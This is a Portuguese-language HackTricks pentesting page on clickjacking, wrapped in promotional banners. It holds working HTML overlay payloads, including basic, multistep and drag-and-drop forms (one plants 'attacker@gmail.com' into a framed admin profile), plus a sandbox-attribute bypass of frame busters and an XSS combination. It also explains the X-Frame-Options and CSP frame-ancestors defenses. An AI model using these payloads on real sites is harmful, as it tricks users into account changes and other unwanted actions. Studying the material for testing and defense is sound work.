# Clickjacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## O que √© Clickjacking

Clickjacking √© um ataque que **enganar** um **usu√°rio** para **clicar** em um **elemento** da p√°gina da web que √© **invis√≠vel** ou disfar√ßado como outro elemento. Isso pode fazer com que os usu√°rios baixem malware sem saber, visitem p√°ginas da web maliciosas, forne√ßam credenciais ou informa√ß√µes confidenciais, transfiram dinheiro ou comprem produtos online. (De [aqui](https://www.imperva.com/learn/application-security/clickjacking/)).

### Truque de preencher formul√°rios

√Äs vezes, √© poss√≠vel **preencher o valor dos campos de um formul√°rio usando par√¢metros GET ao carregar uma p√°gina**. Um atacante pode abusar desse comportamento para preencher um formul√°rio com dados arbitr√°rios e enviar a carga de clickjacking para que o usu√°rio pressione o bot√£o Enviar.

### Preencher formul√°rio com arrastar e soltar

Se voc√™ precisa que o usu√°rio **preencha um formul√°rio** mas n√£o quer pedir diretamente que ele escreva algumas informa√ß√µes espec√≠ficas (como o e-mail e/ou senha espec√≠fica que voc√™ conhece), voc√™ pode simplesmente pedir que ele **arraste e solte** algo que escrever√° seus dados controlados como em [**este exemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload b√°sico
```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload Multistep

O ataque de clickjacking multistep √© uma varia√ß√£o do ataque de clickjacking padr√£o, onde o atacante usa v√°rios cliques em diferentes elementos da p√°gina para realizar a a√ß√£o maliciosa. Isso √© feito para evitar a detec√ß√£o de ferramentas de seguran√ßa que procuram por cliques em um √∫nico elemento.

O ataque multistep √© realizado em v√°rias etapas, onde cada etapa √© um clique em um elemento diferente da p√°gina. Cada clique √© inofensivo por si s√≥, mas quando combinados, eles realizam a a√ß√£o maliciosa desejada pelo atacante.

Por exemplo, um atacante pode criar um bot√£o invis√≠vel em uma p√°gina da web que, quando clicado, redireciona o usu√°rio para uma p√°gina maliciosa. Para evitar a detec√ß√£o, o atacante pode dividir o clique em dois ou mais cliques em diferentes elementos da p√°gina. O primeiro clique pode ser em um bot√£o inofensivo, enquanto o segundo clique pode ser no bot√£o invis√≠vel que redireciona o usu√°rio para a p√°gina maliciosa.

Os ataques multistep podem ser mais dif√≠ceis de detectar e prevenir do que os ataques de clickjacking padr√£o, pois envolvem v√°rios cliques em diferentes elementos da p√°gina. No entanto, as mesmas t√©cnicas de preven√ß√£o de clickjacking padr√£o podem ser usadas para prevenir ataques multistep.
```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload de Arrastar e Soltar + Clique
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se voc√™ identificou um ataque **XSS que requer que o usu√°rio clique** em algum elemento para **disparar** o XSS e a p√°gina √© **vulner√°vel a clickjacking**, voc√™ pode abusar disso para enganar o usu√°rio a clicar no bot√£o/link.\
Exemplo:\
_Voc√™ encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **apenas voc√™ pode definir e ler**). A p√°gina com o **formul√°rio** para definir esses detalhes √© **vulner√°vel** a **Clickjacking** e voc√™ pode **pr√©-preencher** o **formul√°rio** com os par√¢metros GET._\
\_\_Um atacante poderia preparar um ataque de **Clickjacking** para essa p√°gina **pr√©-preenchendo** o **formul√°rio** com a **carga XSS** e **enganando** o **usu√°rio** a **enviar** o formul√°rio. Ent√£o, **quando o formul√°rio √© enviado** e os valores s√£o modificados, o **usu√°rio executar√° o XSS**.

## Como evitar o Clickjacking

### Defesas do lado do cliente

√â poss√≠vel executar scripts no lado do cliente que realizam alguns ou todos os seguintes comportamentos para evitar o Clickjacking:

* verificar e impor que a janela de aplicativo atual √© a janela principal ou superior,
* tornar todos os quadros vis√≠veis,
* impedir o clique em quadros invis√≠veis,
* interceptar e sinalizar poss√≠veis ataques de clickjacking em um usu√°rio.

#### Bypass

Como os frame busters s√£o JavaScript, as configura√ß√µes de seguran√ßa do navegador podem impedir sua opera√ß√£o ou, de fato, o navegador pode nem mesmo suportar JavaScript. Uma solu√ß√£o eficaz para o atacante contornar os frame busters √© usar o **atributo HTML5 iframe `sandbox`**. Quando isso √© definido com os valores `allow-forms` ou `allow-scripts` e o valor `allow-top-navigation` √© omitido, o script do frame buster pode ser neutralizado, pois o iframe n√£o pode verificar se √© ou n√£o a janela superior:
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Tanto os valores `allow-forms` quanto `allow-scripts` permitem as a√ß√µes especificadas dentro do iframe, mas a navega√ß√£o de n√≠vel superior √© desativada. Isso inibe comportamentos de quebra de quadro enquanto permite a funcionalidade dentro do site direcionado.

Dependendo do tipo de ataque de Clickjacking realizado, **voc√™ tamb√©m pode precisar permitir**: `allow-same-origin` e `allow-modals` ou [at√© mais](https://www.w3schools.com/tags/att\_iframe\_sandbox.asp). Ao preparar o ataque, verifique o console do navegador, ele pode informar quais outros comportamentos voc√™ precisa permitir.

### X-Frame-Options

O **cabe√ßalho de resposta HTTP `X-Frame-Options`** pode ser usado para indicar se um navegador deve ou n√£o ser **permitido** a renderizar uma p√°gina em um `<frame>` ou `<iframe>`. Os sites podem usar isso para evitar ataques de Clickjacking, garantindo que **seu conte√∫do n√£o seja incorporado em outros sites**. Defina o cabe√ßalho **`X-Frame-Options`** para todas as respostas que contenham conte√∫do HTML. Os valores poss√≠veis s√£o:

* `X-Frame-Options: deny` que **impede que qualquer dom√≠nio enquadre o conte√∫do** (_valor recomendado_)
* `X-Frame-Options: sameorigin` que permite apenas que o **site atual enquadre o conte√∫do**.
* `X-Frame-Options: allow-from https://trusted.com` que **permite que o 'uri' especificado** enquadre esta p√°gina.
  * Verifique as limita√ß√µes abaixo porque **isso falhar√° se o navegador n√£o suportar**.
  * Outros navegadores suportam a nova diretiva **CSP frame-ancestors em vez disso**. Alguns suportam ambos.

### Diretiva de ancestrais de quadro de pol√≠tica de seguran√ßa de conte√∫do (CSP)

A **prote√ß√£o recomendada contra Clickjacking** √© incorporar a diretiva **`frame-ancestors`** na Pol√≠tica de Seguran√ßa de Conte√∫do da aplica√ß√£o.\
A diretiva **`frame-ancestors 'none'`** √© semelhante em comportamento √† diretiva **X-Frame-Options `deny`** (_Ningu√©m pode enquadrar a p√°gina_).\
A diretiva **`frame-ancestors 'self'`** √© amplamente equivalente √† diretiva **X-Frame-Options `sameorigin`** (_apenas o site atual pode enquadr√°-lo_).\
A diretiva **`frame-ancestors trusted.com`** √© amplamente equivalente √† diretiva **X-Frame-Options** `allow-from` (_apenas o site confi√°vel pode enquadr√°-lo_).

A seguinte lista de permiss√µes CSP permite que os quadros sejam do mesmo dom√≠nio apenas:

`Content-Security-Policy: frame-ancestors 'self';`

Consulte a seguinte documenta√ß√£o para obter mais detalhes e exemplos mais complexos:

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limita√ß√µes <a href="#limitations" id="limitations"></a>

* **Suporte do navegador:** os ancestrais de quadro CSP n√£o s√£o suportados por todos os principais navegadores ainda.
* **X-Frame-Options tem prioridade:** [Se√ß√£o "Rela√ß√£o com X-Frame-Options" da especifica√ß√£o CSP](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) diz: "_Se um recurso for entregue com uma pol√≠tica que inclua uma diretiva chamada frame-ancestors e cuja disposi√ß√£o seja "impor", ent√£o o cabe√ßalho X-Frame-Options DEVE ser ignorado_", mas o Chrome 40 e o Firefox 35 ignoram a diretiva frame-ancestors e seguem o cabe√ßalho X-Frame-Options em vez disso.

## Refer√™ncias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.io/) para criar e **automatizar fluxos de trabalho** com as ferramentas da comunidade mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me no** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
